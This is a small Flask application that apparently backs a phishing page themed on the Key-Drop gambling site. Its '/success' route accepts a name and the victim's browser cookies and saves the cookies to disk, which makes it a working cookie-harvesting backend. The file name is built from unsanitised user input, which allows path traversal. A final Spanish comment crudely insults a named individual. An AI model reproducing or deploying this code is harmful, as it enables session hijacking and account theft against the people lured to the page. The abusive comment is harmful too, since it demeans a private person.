from flask import Flask, render_template, request

app = Flask(__name__)


@app.route('/')
def keydrop():
    title = "Chupala Keydrop"
    return render_template('keydrop.html', title=title)


@app.route('/success', methods=['POST'])
def success():
    name = request.form.get('name')
    cookies = request.form.get('cookies')
    title = "God"

    f = open(f'{name}_cookies.txt', 'w')
    f.write(cookies)
    f.close()

    return render_template('form.html', title=title)

# bloqueado cristian por virgen de mierda, mal amigo y cornudo
